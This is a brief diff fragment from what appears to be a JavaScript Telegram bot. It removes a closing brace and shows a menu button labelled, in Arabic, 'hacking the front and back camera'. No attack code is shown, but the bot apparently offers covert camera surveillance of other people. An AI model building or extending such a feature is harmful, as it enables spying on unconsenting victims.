@@ -616,7 +616,6 @@ async function checkForcedChannels(chatId) {
             }
         }
     }
-}
 
    let keyboard = [
         [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data:'front_camera' }],
